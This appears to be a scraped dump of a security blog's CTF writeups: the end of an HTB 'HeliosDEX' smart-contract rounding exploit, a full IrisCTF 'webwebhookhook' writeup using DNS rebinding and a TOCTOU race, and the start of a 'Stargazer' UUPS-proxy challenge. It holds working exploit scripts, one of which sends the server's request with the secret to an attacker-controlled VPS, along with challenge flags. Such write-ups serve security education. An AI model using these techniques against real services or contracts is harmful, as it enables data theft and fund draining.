reserveMAL; uint256 public reserveHLS; uint256 public immutable exchangeRatioELD = 2; uint256 public immutable exchangeRatioMAL = 4; uint256 public immutable exchangeRatioHLS = 10; uint256 public immutable feeBps = 25; mapping(address =\u0026gt; bool) public hasRefunded; bool public _tradeLock = false; event HeliosBarter(address item, uint256 inAmount, uint256 outAmount); event HeliosRefund(address item, uint256 inAmount, uint256 ethOut); constructor(uint256 initialSupplies) payable { eldorionFang = new EldorionFang(initialSupplies); malakarEssence = new MalakarEssence(initialSupplies); heliosLuminaShards = new HeliosLuminaShards(initialSupplies); reserveELD = initialSupplies; reserveMAL = initialSupplies; reserveHLS = initialSupplies; } modifier underHeliosEye { require(msg.value \u0026gt; 0, \u0026#34;HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter\u0026#34;); _; } modifier heliosGuardedTrade() { require(_tradeLock != true, \u0026#34;HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler\u0026#34;); _tradeLock = true; _; _tradeLock = false; } function swapForELD() external payable underHeliosEye { uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0)); uint256 fee = (grossELD * feeBps) / 10_000; uint256 netELD = grossELD - fee; require(netELD \u0026lt;= reserveELD, \u0026#34;HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome\u0026#34;); reserveELD -= netELD; eldorionFang.transfer(msg.sender, netELD); emit HeliosBarter(address(eldorionFang), msg.value, netELD); } function swapForMAL() external payable underHeliosEye { uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1)); uint256 fee = (grossMal * feeBps) / 10_000; uint256 netMal = grossMal - fee; require(netMal \u0026lt;= reserveMAL, \u0026#34;HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome\u0026#34;); reserveMAL -= netMal; malakarEssence.transfer(msg.sender, netMal); emit HeliosBarter(address(malakarEssence), msg.value, netMal); } function swapForHLS() external payable underHeliosEye { uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3)); uint256 fee = (grossHLS * feeBps) / 10_000; uint256 netHLS = grossHLS - fee; require(netHLS \u0026lt;= reserveHLS, \u0026#34;HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome\u0026#34;); reserveHLS -= netHLS; heliosLuminaShards.transfer(msg.sender, netHLS); emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS); } function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade { require(!hasRefunded[msg.sender], \u0026#34;HeliosDEX: refund already bestowed upon thee\u0026#34;); require(amount \u0026gt; 0, \u0026#34;HeliosDEX: naught for naught is no trade. Offer substance, or be gone!\u0026#34;); uint256 exchangeRatio; if (item == address(eldorionFang)) { exchangeRatio = exchangeRatioELD; require(eldorionFang.transferFrom(msg.sender, address(this), amount), \u0026#34;ELD transfer failed\u0026#34;); reserveELD += amount; } else if (item == address(malakarEssence)) { exchangeRatio = exchangeRatioMAL; require(malakarEssence.transferFrom(msg.sender, address(this), amount), \u0026#34;MAL transfer failed\u0026#34;); reserveMAL += amount; } else if (item == address(heliosLuminaShards)) { exchangeRatio = exchangeRatioHLS; require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), \u0026#34;HLS transfer failed\u0026#34;); reserveHLS += amount; } else { revert(\u0026#34;HeliosDEX: Helios descries forbidden offering\u0026#34;); } uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio); uint256 fee = (grossEth * feeBps) / 10_000; uint256 netEth = grossEth - fee; hasRefunded[msg.sender] = true; payable(msg.sender).transfer(netEth); emit HeliosRefund(item, amount, netEth); } } Upon deployment, the HeliosDEX contract creates 3 ERC20 tokens: EldorionFang, MalakarEssence, and HeliosLuminaShards are each deployed with a specified initial supply. At compilation time exchange rates for these tokens are defined:\nELD: 2 tokens per 1 ETH MAL: 4 tokens per 1 ETH HLS: 10 tokens per 1 ETH Additionally, a fee is deducted from every swap. The fee is defined by feeBps (25 basis points or 0.25%). This fee is applied after calculating the gross token amount, reducing the net tokens that the user receives.\nFocusing on the main functionalities, we notice three swap functions, each with its own rounding mechanism and token exchange rate. Each swap function uses the Math.mulDiv from the OZ Math.sol library to calculate the gross out tokens, specifying also the rounding direction. Each swap function defines a different rounding behavior based on the Rounding struct of the lib:\nswapForELD(): Uses the \u0026ldquo;Floor\u0026rdquo; rounding mode (denoted as value 0). This rounding direction effectively rounds down to the nearest integer, meaning that on floating-point results, the output tokens amount is truncated favorably to the contract. swapForMAL(): Uses the \u0026ldquo;Ceil\u0026rdquo; rounding mode (denoted as value 1). This rounding direction effectively rounds up to the nearest integer, meaning that on floating-point results like 1.50000001, the output tokens amount is rounded up to 2 tokens, returning a favorable amount to the player respectively to the initial swap value. swapForHLS(): Uses the \u0026ldquo;Expand\u0026rdquo; rounding mode (denoted as value 3). This rounding direction ALWAYS rounds up, meaning that on floating-point results like 1.00000001, the output tokens amount is rounded up to 2 tokens, returning a VERY favorable amount to the player respectively to the initial swap value. Based on that observation, we understand that we can exploit the swapForHLS and swapForMAL functions with specifically crafted swap values such that when divided by the exchange rate, the result is a floating-point number that will be rounded up, thus giving us more tokens than expected.\nMoreover, a refund function (oneTimeRefund) is implemented and it\u0026rsquo;s based on the hardcoded original exchange rates that allows users to return tokens in exchange back for Ethers. Given that functionality, we can exploit the rounding behavior to later monetize profitable trades back to ETH.\nHowever, one limitation is that the refund function only allows a one-time operation per user (tracked by hasRefunded), so we need to accumulate enough tokens that will allow us to gain a significant amount of ETH in a single refund operation.\nExploitation # At this point is clear that we can leverage ceil-roundings on swap operations like swapForHLS (\u0026ldquo;Expand\u0026rdquo; rounding mode) and swapForMAL (\u0026ldquo;Ceil\u0026rdquo; rounding mode) to swap a large amount of tokens via favorable exchange rates, and finally refund them all back to ETH with a one-shot refund trade.\nIf the total ETH gain accumulated from each trade doubles the player initial ETH balance, then we\u0026rsquo;ve solved the challenge.\nThe problem on leveraging the swapForMAL swaps is that based on the \u0026ldquo;Ceil\u0026rdquo; rounding mode, we can gain at most 1.5x value from a single trade. Given that the player\u0026rsquo;s initial balance it\u0026rsquo;s 12 ETH, we can get at most 12 ETH * 1.5 = 18 ETH from a one-shot refund trade.\nTo overcome this limitation, we can use the swapForHLS swaps based on the \u0026ldquo;Expand\u0026rdquo; rounding mode, which allows us to gain 2x value from each trade, thus reaching the 20 ETH goal.\nThe exploit script will just be a controlled loop that repeats the swapForHLS trades until we reach the desired projected gain:\n[...] trade_cost = 10**17 + 1 while True: n_trades += 1 print(f\u0026#34;\\n\\n[+] Trade #{n_trades}\u0026#34;) # trigger rounding up to ceil with just 1 wei csend(target_addr, \u0026#34;swapForHLS()\u0026#34;, value=str(trade_cost)) # get current HLS balance hls_balance = int(ccall(hls_token, \u0026#34;balanceOf(address)(uint256)\u0026#34;, player_account.address)) print(f\u0026#34;[+] current HLS balance: {hls_balance}\u0026#34;) eth_gain = ((hls_balance - prev_hsl_balance) * (10**18 / exchange_ratio_hsl)) - trade_cost total_eth_gain = (hls_balance * (10**18 / exchange_ratio_hsl)) - (trade_cost) * n_trades print(f\u0026#34;[+] ETH gain from the trade: {eth_gain}\u0026#34;) print(f\u0026#34;[+] total projected ETH gain: {total_eth_gain}\u0026#34;) assert hls_balance \u0026gt; prev_hsl_balance assert eth_gain \u0026gt; 0 prev_hsl_balance = hls_balance if total_eth_gain \u0026gt;= 10e18: break [...] see the full exploitation script here.\nHTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}\n","date":"15 March 2025","externalUrl":null,"permalink":"/posts/htb-cyberapocalypse-2025/heliosdex/","section":"Blog","summary":"Author writeup for the \u0026ldquo;HeliosDEX\u0026rdquo; easy blockchain challenge from HTB Cyber Apocalypse 2025.","title":"HTB Cyber Apocalypse 2025 - HeliosDEX [Author Writeup]","type":"posts"},{"content":"","date":"15 March 2025","externalUrl":null,"permalink":"/tags/multicall/","section":"Tags","summary":"","title":"Multicall","type":"tags"},{"content":"","date":"15 March 2025","externalUrl":null,"permalink":"/tags/rounding/","section":"Tags","summary":"","title":"Rounding","type":"tags"},{"content":"","date":"15 March 2025","externalUrl":null,"permalink":"/tags/type-checker/","section":"Tags","summary":"","title":"Type-Checker","type":"tags"},{"content":"","date":"15 March 2025","externalUrl":null,"permalink":"/tags/unsafe-arithmetic/","section":"Tags","summary":"","title":"Unsafe-Arithmetic","type":"tags"},{"content":"","date":"15 March 2025","externalUrl":null,"permalink":"/tags/unsafe-casting/","section":"Tags","summary":"","title":"Unsafe-Casting","type":"tags"},{"content":"","date":"15 March 2025","externalUrl":null,"permalink":"/tags/yul/","section":"Tags","summary":"","title":"Yul","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/dns-rebinding/","section":"Tags","summary":"","title":"DNS Rebinding","type":"tags"},{"content":" Update:\nThis writeup was selected as one of the winners of the Iris CTF 2025 writeup competition \u0026ndash;\u0026gt; https://discord.com/channels/1051808836593397781/1051815606732738590/1333226270699294800 TL;DR # The challenge consisted in exploiting a TOCTOU race condition by using DNS rebinding to bypass URL.equals() check in Java.\nDescription # I made a service to convert webhooks into webhooks.\nSource code analysis # Upon extracting the challenge attachments, it will present itself as a Kotlin-based Spring Boot application with very minimal code.\nIn fact the only relevant files to us are WebwebhookhookApplication.kt, State.kt and controller/MainController.kt.\nState.kt\n1package tf.irisc.chal.webwebhookhook 2 3import java.net.URI 4import java.net.URL 5 6class StateType( 7 hook: String, 8 var template: String, 9 var response: String 10 ) { 11 var hook: URL = URI.create(hook).toURL() 12} 13 14object State { 15 var arr = ArrayList\u0026lt;StateType\u0026gt;() 16} The StateType class is being defined to store an hook URL, a mutable template string and a mutable response string. Note that in the constructor, the hook declaration is being shadowed by var hook: URL = URI.create(hook).toURL(), meaning that it will accept hook parameter as string but it\u0026rsquo;ll be casted as an URL object immediately.\nThe StateType class is later used as Collection argument for ArrayList stored inside State.arr.\nThe State object is defined as singleton, meaning there is exactly one instance of State in the entire application.\nThis pattern effectively gives the application a simple in-memory database of all registered hooks and their associated templates.\nWebwebhookhookApplication.kt\n1package tf.irisc.chal.webwebhookhook 2 3import org.springframework.boot.autoconfigure.SpringBootApplication 4import org.springframework.boot.runApplication 5 6@SpringBootApplication 7class WebwebhookhookApplication 8 9const val FLAG = \u0026#34;irisctf{test_flag}\u0026#34;; 10 11fun main(args: Array\u0026lt;String\u0026gt;) { 12 State.arr.add(StateType( 13 \u0026#34;http://example.com/admin\u0026#34;, 14 \u0026#34;{\\\u0026#34;data\\\u0026#34;: _DATA_, \\\u0026#34;flag\\\u0026#34;: \\\u0026#34;\u0026#34; + FLAG + \u0026#34;\\\u0026#34;}\u0026#34;, 15 \u0026#34;{\\\u0026#34;response\\\u0026#34;: \\\u0026#34;ok\\\u0026#34;}\u0026#34;)) 16 runApplication\u0026lt;WebwebhookhookApplication\u0026gt;(*args) 17} This is the main entry point for the application. Here an entry is being added in the global State object, using:\nhttp://example.com/admin as value for the hook parameter. {\u0026quot;data\u0026quot;: _DATA_, \u0026quot;flag\u0026quot;: \u0026quot;irisctf{test_flag}\u0026quot;} as value for the template string. {\u0026quot;response\u0026quot;: \u0026quot;ok\u0026quot;} as value for the response string. Let\u0026rsquo;s analyze the application further to understand how we might be able to read that flag.\ncontroller/MainController.kt\n1package tf.irisc.chal.webwebhookhook.controller 2 3import org.springframework.http.MediaType 4import org.springframework.stereotype.Controller 5import org.springframework.ui.Model 6import org.springframework.web.bind.annotation.* 7import tf.irisc.chal.webwebhookhook.State 8import tf.irisc.chal.webwebhookhook.StateType 9import java.net.HttpURLConnection 10import java.net.URI 11 12@Controller 13class MainController { 14 15 @GetMapping(\u0026#34;/\u0026#34;) 16 fun home(model: Model): String { 17 return \u0026#34;home.html\u0026#34; 18 } 19 20 @PostMapping(\u0026#34;/webhook\u0026#34;) 21 @ResponseBody 22 fun webhook(@RequestParam(\u0026#34;hook\u0026#34;) hook_str: String, @RequestBody body: String, @RequestHeader(\u0026#34;Content-Type\u0026#34;) contentType: String, model: Model): String { 23 var hook = URI.create(hook_str).toURL(); 24 for (h in State.arr) { 25 if(h.hook == hook) { 26 var newBody = h.template.replace(\u0026#34;_DATA_\u0026#34;, body); 27 var conn = hook.openConnection() as? HttpURLConnection; 28 if(conn === null) break; 29 conn.requestMethod = \u0026#34;POST\u0026#34;; 30 conn.doOutput = true; 31 conn.setFixedLengthStreamingMode(newBody.length); 32 conn.setRequestProperty(\u0026#34;Content-Type\u0026#34;, contentType); 33 conn.connect() 34 conn.outputStream.use { os -\u0026gt; 35 os.write(newBody.toByteArray()) 36 } 37 38 return h.response 39 } 40 } 41 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;fail\\\u0026#34;}\u0026#34; 42 } 43 44 @PostMapping(\u0026#34;/create\u0026#34;, consumes = [MediaType.APPLICATION_JSON_VALUE]) 45 @ResponseBody 46 fun create(@RequestBody body: StateType): String { 47 for(h in State.arr) { 48 if(body.hook == h.hook) 49 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;fail\\\u0026#34;}\u0026#34; 50 } 51 State.arr.add(body) 52 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;ok\\\u0026#34;}\u0026#34; 53 } 54} The router for the Spring Boot Application is configured to have the /create and the /webhook endpoints.\nThe /create endpoint accepts POST requests with application/json body that will be casted as StateType. Then it checks if an entry with same hook is already occurring in the global State object, and if so, it will return a json response of {\u0026quot;result\u0026quot;: \u0026quot;fail\u0026quot;}. After iterating the ArrayList, if no matching instances were found, a new StateType entry will be appended.\nEssentially, this endpoint registers a new webhook configuration, unless it already exists. The /webhook endpoint will accept POST requests with a hook parameter. It will iterate over the State.arr global list of previously created webhook configurations, and if it finds a matching hook URL, it will replace the _DATA_ placeholder in the template with the content of the supplied body, and send a POST request to the given hook URL using HttpURLConnection with the new body. If the hook URL is not found in the State.arr, it will return a json response of {\u0026quot;result\u0026quot;: \u0026quot;fail\u0026quot;}. Note\nBoth endpoints do not provide SSRF protections, however it\u0026rsquo;s irrelevant for us as there are no additional services running on the server. Vulnerability discovery # At first glance, there doesn\u0026rsquo;t seem to be an obvious way to intercept the flag, since the only way would be to successfully match the hook check and send the POST to example.org, which would be ez game if we were the admins of domain, which is not the case :P\nOne of my first steps was to try an HTTP smuggling, given the arbitrary control over the body that then replaces the content of _DATA_, to build a request like this:\nSmuggling attempt on body content. However, we note how the body of the request is correctly set based on the length of our payload at L31 with conn.setFixedLengthStreamingMode(newBody.length) consequently failing to delimit the stream of the request to build a new one. Furthermore, it is not possible to override the request headers and in any case it would be a matter of exploiting a Spring Boot HTTP desync but today will not be the day of 0-days :/\nFinally, in a scenario of arbitrary write in the system we could have tried to overwrite /etc/hosts file to override the DNS resolution of example.org and make it point to an IP under our control, but again, this is not the case for the challenge.\nDoomscrolling remembrance of a random tweet to win # At that point I was pretty lost, the code was really minimal and I had to somehow pull off a complete domain check bypass from a bunch of URL comparisons\u0026hellip;\nWait did I say \u0026ldquo;domain check bypass\u0026rdquo; and \u0026ldquo;url comparison\u0026rdquo; !?\nThat\u0026rsquo;s exactly what I said to myself while overthinking the challenge and immediately after I had the remembrance of a (quite strange) Java behavior that I barely read about in a random tweet months ago while doomscrolling on X, which pointed out how comparing two URL objects in Java triggers a DNS resolution üíÄ\nYour brain on Java is when comparing two strings REQUIRES A DNS LOOKUP pic.twitter.com/VYzNBFri5b\n\u0026mdash; Dmitrii Kovanikov (@ChShersh) September 8, 2024 More of that is discussed at the end of the writeup here.\nAt this point this enlightenment gave me a clear path to the resolution using DNS rebinding:\nsubmit to /endpoint a domain like rbndr.us that resolves to the IP of example.com. URL.equals() will trigger a DNS resolution on rbndr.us that will make succeed the check against example.com. make the rbndr.us domain resolve to different IP under our control. the POST request will be sent to the IP under our control, with the template body containing the flag. Yep. That\u0026rsquo;s it. Simple as that right?\nü•≤\nNo. ü•≤\nWell, kinda, in theory (and in practice) that would work, I confirmed that the DNS resolution was made on the provided domain and by using a DNS rebinding service like rbndr.us I was able to get different response status codes from the server (because different domains were resolved each time).\nThis behavior was caused by the under the hood work of rbndr, which as explained on their repo, all it does is simply provide a domain that resolves to IP A with a very low TTL, and then immediately switches the DNS resolution to IP B so that when a new DNS query is made to the same domain the second time it\u0026rsquo;ll point a different IP address.\nAll of that is the basics of how a DNS rebinding attack works, which you can read more about here.\nThe main hurdle however was not to make DNS rebinding work, but to leverage DNS rebinding to cause a Time-of-check to time-of-use (TOCTOU) type race when:\n1) the domain DNS resolves to example.org IP to make the URL.equals() succeed\nand\n2) the server opens a connection against my domain (causing a new DNS resolution) to send the request with the flag.\nTOCTOU race + DNS cache revalidation # Unfortunately for my sanity, as we can see from the code between L23 and L25, trying to exploit such a window between the check and the socket connection, meant finding a precision of a matter of milliseconds.\n23if(h.hook == hook) { 24 var newBody = h.template.replace(\u0026#34;_DATA_\u0026#34;, body); 25 var conn = hook.openConnection() as? HttpURLConnection; Moreover, Java\u0026rsquo;s built-in DNS cache mechanism made things even more complicated.\nWhile testing my basic DNS rebinding primitive, I noticed that I was getting the same status code in response to the /webhook endpoint for a period of 30 seconds. This sounded a bit strange to me since my DNS server was configured to reply with a 1 second TTL. In fact, what I did was a quick sanity check using both curl and python, and from both these clients the response to my rebinder domain kept changing every second:\nPython DNS test: caching NOT enabled Java DNS test: caching enabled \u0026quot;idk if java is doing some weird caching, python and curl behave differently. Trying multithread. I think i\u0026rsquo;m dossing example.org\u0026quot; üíÄ Clearly some caching was at work in the Java side. It turns out that Java caches a DNS resolution for 30 seconds, which meant that we wanted to get our timing right when sending payload to the /webhook endpoint, so that the cache would be fetched at the time of comparison against example.org, to be invalidated immediately afterwards, thus requiring a cache revalidation at the time of the socket connection to send the flag to a domain under our control.\nBelow I\u0026rsquo;ve illustrated the attack workflow.\nsequenceDiagram title DNS Rebinding attack flow on Java `URL.equals()` participant Attacker as Attacker participant ChallengeServer as Challenge Server participant AttackerServer as Attacker Rebinder Service (xxxx.rbndr.us) participant DNS as Attacker DNS Server Attacker-\u003e\u003eChallengeServer: POST /endpoint ?hook=xxxx.rbndr.us note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over DNS: ... note over ChallengeServer: 1) the server code uses URL.equals() to compare ‚Äúxxxx.rbndr.us‚Äù vs ‚Äúexample.org‚Äù ChallengeServer-\u003e\u003eDNS: DNS Query A for xxxx.rbndr.us note over DNS: 2) DNS A Record is 93.184.215.14, TTL=1 (example.org IP) DNS--\u003e\u003eChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 93.184.215.14 note over ChallengeServer: 3) URL.equals() returns true because IP matches example.org note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over ChallengeServer: 4) hook.openConnection() where hook=xxxx.rbndr.us ChallengeServer-\u003e\u003eDNS: DNS Query A for xxxx.rbndr.us note over DNS: 5) DNS A Record is 83.130.170.16, TTL=1 (attacker IP) DNS ‚Äúrebinding‚Äù event, xxxx.rbndr.us is resolving to Attacker's IP DNS--\u003e\u003eChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 83.130.170.16 note over ChallengeServer: 5) Opens HTTP connection to 83.130.170.16 note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: ... ChallengeServer-\u003e\u003eAttacker: POST to 83.130.170.16 {\"flag\":\"irisctf{...}\"} Attacker--\u003e\u003eAttacker: Captures the flag (win) A trick I used to increase my chances of hitting the exact window between Step 1 and Step 4 was to send a large payload in the body to be processed, so that L34 would have a slightly longer execution time to give us the possibility of hitting the cache revalidation switch in a larger window.\nNOTE\nAn interesting rabbit hole would be to understand how String.replace() is performed internally by Java/Kotlin, since there could be the possibility of using some classic ReDoS tricks to increase the execution time of h.template.replace(\u0026quot;_DATA_\u0026quot;, body) even more. Exploitation (cry and pray) # Having gathered all the elements to exploit, I proceeded to write the following python script:\nexploit.py\n#!/usr/bin/python3 import requests import time import threading from concurrent.futures import ThreadPoolExecutor, as_completed RBNDR = \u0026#34;http://5db8d70e.5e82aa10.rbndr.us\u0026#34; CHALL_URL = \u0026#34;https://webwebhookhook-43435a7246999280.i.chal.irisc.tf\u0026#34; BATCH_SIZE = 20 DELAY_BETWEEN_BATCHES = 0.1 req_id = 0 req_id_lock = threading.Lock() def send_request(session, url, payload): global req_id try: response = session.post(url, headers={\u0026#34;Content-Type\u0026#34;:\u0026#34;application/x-www-form-urlencoded\u0026#34;}, data=payload, timeout=10) with req_id_lock: req_id += 1 current_id = req_id print(f\u0026#34;{current_id} {response.text} {response.status_code}\u0026#34;) except Exception as e: with req_id_lock: req_id += 1 current_id = req_id print(f\u0026#34;{current_id} Error: {e}\u0026#34;) def main(): url = f\u0026#34;{CHALL_URL}/webhook?hook={RBNDR}/admin\u0026#34; # we need to also match url path payload = \u0026#34;A\u0026#34;*1000 with requests.Session() as session: with ThreadPoolExecutor(max_workers=BATCH_SIZE) as executor: while True: futures = [ executor.submit(send_request, session, url, payload) for _ in range(BATCH_SIZE) ] for future in as_completed(futures): pass time.sleep(DELAY_BETWEEN_BATCHES) if __name__ == \u0026#34;__main__\u0026#34;: main() A little bit of explanation for it:\nThe RBNDR url was constructed with a rebinder service using the example.com IP as the first IP and my VPS IP as the second IP. I opted for a requests batched approach to have an high density of requests in a short time window. Large body payload to increase the execution time of h.template.replace(\u0026quot;_DATA_\u0026quot;, body) and thus increasing the duration of the target window. Spamming the /webhook to have different DNS cache revalidation timings and increase the chances of an IP switch happening inside the target window. So, at this point i just run the exploit, prayed and went to have lunch, aaand when i got back i saw this in my VPS console output\nRequest with the flag received on the VPS Extra # But why the hell does Java do DNS resolutions on simple == comparisons? # While many weird Java behaviors could be simply explained with the phrase \u0026ldquo;because Java.\u0026rdquo; I wanted to try to justify why the Java devs choose to do DNS resolutions on simple equal comparisons.\nLet\u0026rsquo;s start from the fact that mainly in Java everything is an object allocated in the heap, except for primitives like int, char, byte, long, String and a few more. Therefore when the JVM has to do comparison of two objects, to see if those two objects are equal, it must check that they are equal in every way. In fact, if you create two objects of two identical classes, their comparison will return false because they have different references in memory.\nAs a result Java devs probably said something like \u0026ldquo;you don\u0026rsquo;t like it? jk what? Implement the damn comparison by yourself\u0026rdquo;. So practically every object in Java has its own magic method .equals() which corresponds to its custom implementation to do more intelligent checks and not make two objects have to be just two deep copies to be equal.\nWhoever wrote the URL class thought well that to effectively check that two URL objects are equal, they not only must have every property in common (path, protocol, port, \u0026hellip;) but must also resolve to the same IP. To find out this, obviously Java needs to perform a DNS resolution.\nQuestionable choice? Absolutely.\nThis is what it is anyway? Yes and we have to live with it and in case we simply want to compare two URLs as strings we should use the URI class.\nFun Fact: as someone said in this not so happy discussion about this behavior here, that choice was originally made to prevent DNS rebinding attacks.\nFlag: irisctf{url_equals_rebind}\n","date":"12 January 2025","externalUrl":null,"permalink":"/posts/irisctf-2025/webwebhookhook/","section":"Blog","summary":"Writeup for webwebhookhook web challenge of IrisCTF 2025","title":"IrisCTF 2025 - webwebhookhook","type":"posts"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/race-condition/","section":"Tags","summary":"","title":"Race Condition","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/toctou/","section":"Tags","summary":"","title":"TOCTOU","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"5 December 2024","externalUrl":null,"permalink":"/tags/ecrecover/","section":"Tags","summary":"","title":"Ecrecover","type":"tags"},{"content":"","date":"5 December 2024","externalUrl":null,"permalink":"/tags/erc-7201/","section":"Tags","summary":"","title":"ERC-7201","type":"tags"},{"content":" Stargazer # 10th Aug 2024 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Hard\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-UniversityCTF-2024/Stargazer TLDR # The challenge consists in exploiting ecrecover signature malleability in a UUPSUpgradeable contract to authorize implementation upgrade and override ERC7201 storage.\nDescription # The Frontier Cluster teeters on the brink of collapse. The planet is ravaged by exploitation and environmental decay, driven by ruthless corporations that have merged into a singular, omnipotent entity known as \u0026ldquo;The Frontier Board.\u0026rdquo; In a desperate bid to secure humanity\u0026rsquo;s future, a visionary engineer constructs the \u0026ldquo;Stargazer\u0026rdquo;: a conscious and empathetic machine designed to endure the harshest conditions of unknown planets.\nStargazer\u0026rsquo;s mission is monumental: to explore uncharted worlds, gather crucial data, and identify new planets suitable for colonization. Equipped with advanced sensors and a soulful artificial intelligence, it traverses the cosmos, witnessing celestial wonders beyond human imagination.\nAmidst its journey through the stars, Stargazer develops a profound sense of melancholy. Despite observing breathtaking cosmic events (supernovae, nebulae, and elusive shooting stars) it is burdened by the realization that many of these phenomena are transient, never to be witnessed again. One such event is the \u0026ldquo;Starry Spurr,\u0026rdquo; a rare shooting star emitting a unique cosmic frequency, occurring once every millennium.\nYour goal is to deceive the machine kernel into believing that it is experiencing the advent of \u0026ldquo;Starry Spurr\u0026rdquo; for the second time, in order to bring back joy and solace to the machine.\nSkills Required # Knowledge of Ethereum\u0026rsquo;s storage layout and storage pointers Familiarity with proxy contracts and upgradeability patterns (UUPS) Knowledge of Ethereum signatures and ECDSA Skills Learned # Identifying and exploiting vulnerabilities in upgradeable smart contracts Exploiting signature malleability Analyzing the source code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.20; import { Stargazer } from \u0026#34;./Stargazer.sol\u0026#34;; import { StargazerKernel } from \u0026#34;./StargazerKernel.sol\u0026#34;; contract Setup { Stargazer public immutable TARGET_PROXY; StargazerKernel public immutable TARGET_IMPL; event DeployedTarget(address proxy, address implementation); constructor(bytes memory signature) payable { TARGET_IMPL = new StargazerKernel(); string[] memory starNames = new string[](1); starNames[0] = \u0026#34;Nova-GLIM_007\u0026#34;; bytes memory initializeCall = abi.encodeCall(TARGET_IMPL.initialize, starNames); TARGET_PROXY = new Stargazer(address(TARGET_IMPL), initializeCall); bytes memory createPASKATicketCall = abi.encodeCall(TARGET_IMPL.createPASKATicket, (signature)); (bool success, ) = address(TARGET_PROXY).call(createPASKATicketCall); require(success); string memory starName = \u0026#34;Starry-SPURR_001\u0026#34;; bytes memory commitStarSightingCall = abi.encodeCall(TARGET_IMPL.commitStarSighting, (starName)); (success, ) = address(TARGET_PROXY).call(commitStarSightingCall); require(success); emit DeployedTarget(address(TARGET_PROXY), address(TARGET_IMPL)); } function isSolved() public returns (bool) { bool success; bytes memory getStarSightingsCall; bytes memory returnData; getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, (\u0026#34;Nova-GLIM_007\u0026#34;)); (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall); require(success, \u0026#34;Setup: failed external call.\u0026#34;); uint256[] memory novaSightings = abi.decode(returnData, (uint256[])); getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, (\u0026#34;Starry-SPURR_001\u0026#34;)); (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall); require(success, \u0026#34;Setup: failed external call.\u0026#34;); uint256[] memory starrySightings = abi.decode(returnData, (uint256[])); return (novaSightings.length \u0026gt;= 2 \u0026amp;\u0026amp; starrySightings.length \u0026gt;= 2); } } The Setup contract is more complex than usual. Although the complexity was added by the fact that the target contract is an upgradable contract, meaning that raw calls need to be made to interact with the proxy and the underlying implementation contract.\nThe setup involves deploying the implementation code, initializing it, calling an authorized function and passing to it a valid signature. The implementation address is finally set in the proxy contract.\nIn order to solve this challenge, we need to \u0026ldquo;override\u0026rdquo; the Stargazer \u0026ldquo;memory\u0026rdquo; and make it believe the past sightings of the stars \u0026ldquo;Nova-GLIM_007\u0026rdquo; and \u0026ldquo;Starry-SPURR_001\u0026rdquo;, are actually a recurrent event and that it\u0026rsquo;s the second time he\u0026rsquo;s seeing them.\nIn other words, the Stargazer mapping that maps a starId to their number of occurrences, which must be greater than 1 for both stars.\nStargazer.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.20; import \u0026#34;@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\u0026#34;; contract Stargazer is ERC1967Proxy { constructor(address _implementation, bytes memory _data) ERC1967Proxy(_implementation, _data) {} } /************************************************************************** a lonely machine in a lonely world looking a lonely shooting star... *************************************************************************** ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä 